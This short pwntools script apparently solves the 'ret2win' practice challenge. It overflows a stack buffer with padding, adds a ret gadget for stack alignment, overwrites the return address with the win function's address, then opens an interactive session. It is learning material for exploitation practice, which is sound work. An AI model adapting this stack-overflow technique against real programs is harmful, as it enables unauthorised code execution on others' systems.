from pwn import gdb, process, p64   # type: ignore

'''target = gdb.debug(
    "./ret2win",
    gdbscript="b *0x400754"
)'''
target = process("./ret2win")

ret2win = p64(0x00400756)

payload = b''
payload += b'A' * 0x20
payload += b'B' * 0x8
payload += p64(0x40053e)  # ret
payload += ret2win
target.sendline(payload)
target.interactive()
